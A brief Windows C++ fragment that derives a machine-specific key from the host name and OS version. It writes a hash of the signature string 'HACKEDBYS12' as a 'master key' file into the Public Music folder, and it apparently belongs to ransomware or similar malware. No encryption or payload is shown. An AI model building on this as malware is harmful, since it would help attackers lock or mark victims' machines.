#include <string>
#include <windows.h>
#include "S12HashClass.h"

using namespace std;

string getkey() {
    OSVERSIONINFO osVersionInfo;
    osVersionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    GetVersionEx(&osVersionInfo);

    char hostName[256];
    DWORD hostNameSize = 256;
    GetComputerNameA(hostName, &hostNameSize);

    int numkey = osVersionInfo.dwMajorVersion * 12 + 12 * 666 * 24 + 9 * 2 * 29 * 67; 

    string finalkey = hostName;
    finalkey += to_string(numkey);

    return finalkey;
}

void FileMasterKey() {
    string key = "HACKEDBYS12";
    S12HashClass hashobj = S12HashClass(key);
    
    ofstream keyFile("C:\\Users\\Public\\Music\\key.txt");
    if (keyFile.is_open()) {
        keyFile << hashobj.getFinalHashValue(); 
        keyFile.close();
    }
}


